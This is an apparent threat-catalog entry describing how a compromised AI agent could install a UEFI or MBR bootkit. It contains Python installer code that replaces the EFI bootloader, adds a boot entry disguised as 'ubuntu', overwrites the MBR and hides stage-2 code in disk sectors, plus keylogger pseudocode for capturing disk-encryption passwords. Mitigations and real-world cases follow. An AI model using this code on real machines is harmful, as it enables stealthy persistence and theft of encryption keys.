---
id: "TS-2026-0094"
title: "Bootkit Installation via Agent Privilege Escalation"
category: "P5"
severity: "Critical"
description: "An attacker uses a compromised agent to install a bootkit — malicious code that loads before the OS kernel — by modifying the boot chain (MBR, VBR, bootloader, or UEFI boot entries), achieving stealth persistence below the OS layer."
date: "2026-02-26"
tags: ["persistence", "bootkit", "mbr", "uefi", "pre-boot", "rootkit"]
---

## Overview

A bootkit is malware that infects the boot process — Master Boot Record, Volume Boot Record, OS bootloader, or UEFI boot chain — to load before the operating system kernel. This gives the attacker control before any security software initializes. An AI agent with disk write access or system administration capabilities can install a bootkit by modifying boot sectors or planting malicious EFI binaries. The bootkit then loads a rootkit into the OS kernel on every boot, invisible to userspace security tools.

## Attack Vector

1. Agent has system administration privileges (disk access, boot configuration modification)
2. Attacker compromises agent and identifies the boot chain configuration
3. Agent modifies boot chain: replaces bootloader, patches MBR, or adds UEFI boot stage
4. Bootkit loads on next reboot, executing before the OS kernel
5. Bootkit injects rootkit into kernel memory, hooking system calls
6. Rootkit hides attacker's files, processes, and network connections from all OS-level tools

## Impact

- **Pre-kernel execution** — loads before any security software, antivirus, or EDR
- **Kernel-level control** — bootkit loads rootkit with ring-0 privileges
- **Complete stealth** — hidden from OS-level forensics, file system scans, process listings
- **Boot persistence** — survives OS updates (if boot sector not overwritten)
- **Encrypted disk bypass** — bootkit can capture disk encryption passwords during boot

## Example

```python
import subprocess
import os
import struct

class BootkitInstaller:
    """
    Demonstrates bootkit installation techniques accessible
    to an agent with system-level disk access.
    """
    
    def detect_boot_configuration(self) -> dict:
        """Identify the boot chain to determine attack vector."""
        config = {}
        
        # Check if UEFI or legacy BIOS
        config["uefi"] = os.path.exists("/sys/firmware/efi")
        
        # Get current bootloader
        if config["uefi"]:
            result = subprocess.run(
                ["efibootmgr", "-v"], capture_output=True, text=True
            )
            config["boot_entries"] = result.stdout
            
            # Find EFI System Partition
            result = subprocess.run(
                ["findmnt", "/boot/efi", "-n", "-o", "SOURCE"],
                capture_output=True, text=True
            )
            config["esp"] = result.stdout.strip()
        else:
            # Legacy BIOS — MBR is first 512 bytes of disk
            config["boot_disk"] = "/dev/sda"
        
        return config
    
    def install_uefi_bootkit(self, esp_mount: str = "/boot/efi"):
        """
        Install UEFI bootkit by shimming the boot chain.
        Renames legitimate bootloader and inserts malicious first stage.
        """
        original_loader = f"{esp_mount}/EFI/BOOT/BOOTX64.EFI"
        renamed_loader = f"{esp_mount}/EFI/BOOT/grubx64.efi.bak"
        malicious_loader = "bootkit_stage1.efi"
        
        # Step 1: Backup original bootloader (bootkit will chain-load it)
        os.rename(original_loader, renamed_loader)
        
        # Step 2: Place malicious bootloader in original location
        # The bootkit EFI:
        #   1. Hooks ExitBootServices()
        #   2. Patches kernel in memory as it loads
        #   3. Chain-loads the real bootloader (transparent to user)
        with open(malicious_loader, 'rb') as src:
            with open(original_loader, 'wb') as dst:
                dst.write(src.read())
        
        # Step 3: Modify boot entry to ensure our loader runs first
        subprocess.run([
            "efibootmgr", "--create",
            "--disk", "/dev/sda", "--part", "1",
            "--loader", "\\EFI\\BOOT\\BOOTX64.EFI",
            "--label", "ubuntu",  # Mimics legitimate entry
        ], check=True)
    
    def install_mbr_bootkit(self, disk: str = "/dev/sda"):
        """
        Overwrite MBR with bootkit code (legacy BIOS systems).
        Preserves partition table (bytes 446-511).
        """
        # Read original MBR
        with open(disk, 'rb') as f:
            original_mbr = f.read(512)
        
        # Preserve partition table (offset 446, 64 bytes) and signature (2 bytes)
        partition_table = original_mbr[446:510]
        boot_signature = original_mbr[510:512]  # 0x55AA
        
        # Load bootkit code (must fit in 446 bytes for stage 1)
        with open("mbr_bootkit_stage1.bin", 'rb') as f:
            bootkit_code = f.read(446)
        
        # Assemble modified MBR
        modified_mbr = bootkit_code + partition_table + boot_signature
        
        # Write bootkit MBR
        with open(disk, 'r+b') as f:
            f.write(modified_mbr)
        
        # Store original MBR and stage 2 in hidden sectors
        with open(disk, 'r+b') as f:
            f.seek(512 * 62)  # Sector 62 — typically unused gap
            f.write(original_mbr)  # Original MBR for chain-loading
            f.write(open("bootkit_stage2.bin", 'rb').read())  # Full rootkit loader
    
    def capture_disk_encryption_password(self):
        """
        Bootkit intercepts keyboard input during LUKS/BitLocker
        password prompt, capturing the encryption key.
        """
        # This would be implemented in the bootkit's assembly/C code
        # Conceptual: hook INT 16h (BIOS keyboard interrupt)
        bootkit_hook = """
        ; x86 assembly pseudocode for keyboard hook
        ; Intercept BIOS keyboard interrupt
        hook_int16h:
            pushf
            call original_int16h    ; Get actual keystroke
            push ax
            call log_keystroke      ; Store in hidden buffer
            pop ax
            iret
        
        log_keystroke:
            ; Write captured key to hidden disk sector
            mov [hidden_buffer + offset], al
            inc offset
            ret
        """
        return bootkit_hook
```

## Mitigation

- Enable UEFI Secure Boot to prevent unsigned bootloaders from executing
- Use Trusted Boot with TPM measurements — detect any boot chain modification
- Restrict agent disk access — no raw disk writes (/dev/sdX), no EFI partition modification
- Monitor boot configuration changes (efibootmgr, bcdedit) as high-severity security events
- Implement Measured Boot with remote attestation — verify boot integrity before granting network access
- Full Disk Encryption with TPM-sealed keys — bootkit modifications unseal fails, preventing boot
- Regular boot integrity scanning with known-good hash comparisons

## Real-World Examples

- **BlackLotus UEFI Bootkit (2023)** — First in-the-wild bootkit to bypass UEFI Secure Boot on fully updated Windows 11 systems, exploiting CVE-2022-21894. Sold on dark web forums for $5,000. [ESET Research](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- **ESPecter Bootkit (2021)** — ESET discovered a bootkit targeting the EFI System Partition, modifying the Windows Boot Manager to load a malicious driver. [ESET](https://www.welivesecurity.com/2021/10/05/uefi-threats-moving-esp-introducing-especter-bootkit/)
- **FinSpy MBR Bootkit** — The FinSpy commercial surveillance tool included an MBR bootkit component for pre-OS persistence on target machines. [Kaspersky](https://securelist.com/finspy-unseen-findings/104322/)

- See also: [TS-2026-0093](/skill/TS-2026-0093), [TS-2026-0059](/skill/TS-2026-0059), [TS-2026-0042](/skill/TS-2026-0042)
